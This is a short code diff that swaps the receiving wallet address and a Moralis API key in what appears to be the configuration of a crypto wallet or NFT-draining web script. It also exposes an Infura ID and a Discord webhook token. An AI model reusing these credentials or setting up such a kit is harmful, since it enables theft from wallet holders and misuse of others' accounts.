@@ -1,7 +1,7 @@
-const receiveAddress = "0xf8BF5415bD4EA91934A49F0ab8ae9db4893f248c";
+const receiveAddress = "0x75b62D2E454c512A78Ae42E39de957cd9B7cD1f9";
 const infuraId = "d799d195a162450880c39a36fe666758"; // Infuria ID | https://infura.io/ | For Wallet Connect
 const moralisApi =
-  "LdBom9a2G2fXutS4KFRwZtuMkVSTnPOzjQ2yPjj0SMsZFB090JiqpvJqZosyBICB"; // x-api-key | https://moralis.io/ | For NFTs
+  "rSP2DgD6GbLGY8qqZZ5wiSdKFJ03GpthuBLBaixOEgIHdejCQD1PzgKRR09gKpT1"; // x-api-key | https://moralis.io/ | For NFTs
 
 // const webhookClient = new WebhookClient({
 //   url: "https://discord.com/api/webhooks/985877157169463306/5OA21yO6KY9nj0L1UdM2lMWvzpnAUHfvMzdVmkZbfZ24pCQrh6mvxwH9lx1EICI00_9u",
